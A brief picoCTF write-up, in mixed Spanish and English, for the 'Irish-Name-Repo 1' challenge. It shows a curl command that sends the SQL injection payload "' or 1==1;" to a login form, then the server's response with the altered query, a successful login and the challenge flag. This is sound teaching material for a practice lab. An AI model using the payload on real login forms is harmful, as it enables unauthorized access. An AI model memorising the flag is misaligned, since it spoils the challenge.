# Irish-Name-Repo 1

## Objetivo 
There is a website running at `https://jupiter.challenges.picoctf.org/problem/39720/` ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!

Sugerencias:
usar sql injection

## Solución
``` shell
└─$ curl -s https://jupiter.challenges.picoctf.org/problem/39720/login.php -d "username=admin&password=' or 1==1;&debug=1"  
<pre>username: admin
password: ' or 1==1;
SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1==1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_c218b685}</p>                                                                                                

```

## Notas

isando ese comando podemos inyectar codigo por sql y engañar el sistema

## Referencias
[SQL Injection](https://www.w3schools.com/sql/sql_injection.asp)
